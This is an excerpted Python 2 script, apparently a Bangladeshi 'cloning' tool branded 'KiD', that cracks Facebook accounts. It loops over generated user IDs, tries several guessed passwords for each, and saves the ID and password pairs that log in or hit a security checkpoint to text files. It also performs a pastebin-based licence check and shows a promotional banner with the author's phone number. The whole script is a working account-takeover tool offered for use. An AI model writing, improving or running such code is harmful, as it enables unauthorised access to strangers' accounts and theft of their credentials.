...
logo2 = '\n\x1b[1;92m /$$   /$$ /$$$$$$ /$$   /$$ /$$$$$$\n| $$$ | $$|_  $$_/| $$  /$$/|_  $$_/\n| $$$$| $$  | $$  | $$ /$$/   | $$\n| $$ $$ $$  | $$  | $$$$$/    | $$\n| $$  $$$$  | $$  | $$  $$    | $$\n| $$\  $$$  | $$  | $$\  $$   | $$\n| $$ \  $$ /$$$$$$| $$ \  $$ /$$$$$$\n|__/  \__/|______/|__/  \__/|______/\n                                        \n\x1b[0;35m \n       \x1b[101m\x1b[37;1mWelcome To Super Fast Cloning Tools\x1b[0m\n       \x1b[101m\x1b[37;1m  GIVEN BY Mr. KiD\x1b[0m\n\x1b[1;91m-----------------------------------------------\n\x1b[0;31m\xe2\x8b\x9f\x1b[0;32m YOUTUBE    : \x1b[0;32m Mr. KiD  \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mWHATSAAP   :  \x1b[0;32m+8801645137393 \n\x1b[0;31m\xe2\x8b\x9f \x1b[0;32mFACEBOOK   :  \x1b[0;32mKiD.CYBER404.OFFICIALS (KiD) \n\x1b[1;91m-----------------------------------------------'
...
def jenw():
    ...
    KiD = input('\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Enter Amount\x1b[1;93m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
    tik()
    for n in range(KiD):
...
def reg():
    ...
    time.sleep(1)
    try:
        to = open('/sdcard/Download/.jjps.jt', 'r').read()
    except (KeyError, IOError):
        reg2()
    try:
        r = requests.get('https://pastebin.com/raw/8aFyciTT').text
...
def reg2():
    ...
    sav = open('/sdcard/Download/.jjps.jt', 'w')
    sav.write(id)
    sav.close()
...
def login():
    ...
    print logo1
    print 47 * '\x1b[1;91m-'
    print '\x1b[1;91m         [\x1b[1;93m*\x1b[1;91m]\x1b[1;92m KiD OLD UID CRACKING\x1b[1;91m [\x1b[1;93m*\x1b[1;91m]'
    print 47 * '\x1b[1;91m-'
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m [\x1b[1;92mKiD-OK\x1b[1;92m] ' + k + c + user + '  |  ' + pass1
                okb = open('KiDok.txt', 'a')
                okb.write(k + c + user + " | " + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m [\x1b[1;91mKiD-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass1
                cps = open('KiDcp.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m [\x1b[1;92mKiD-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass2
                    okb = open('KiDok.txt', 'a')
                    okb.write(k + c + user + " | " + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m [\x1b[1;91mKiD-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass2
                    cps = open('KiDcp.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m [\x1b[1;92mKiD-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass3
                        okb = open('KiDok.txt', 'a')
                        okb.write(k + c + user + " | " + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m [\x1b[1;91mKiD-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
                        cps = open('KiDcp.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m [\x1b[1;92mKiD-OK\x1b[1;92m]  ' + k + c + user + '  |  ' + pass4
                            okb = open('KiDok.txt', 'a')
                            okb.write(k + c + user + " | " + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m [\x1b[1;91mKiD-CP\x1b[1;91m] ' + k + c + user + '  |  ' + pass4
                            cps = open('KiDcp.txt', 'a')
    ...
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Total \x1b[1;92mKiD-OK/\x1b[1;91mKiD-CP \x1b[1;93m: ' + str(len(oks)) + '/' + str(len(cpb))
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Cloned Accounts Has Been Saved\x1b[1;93m :\x1b[1;92m KiD.txt'
    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Thanks For Using KiD Tool'
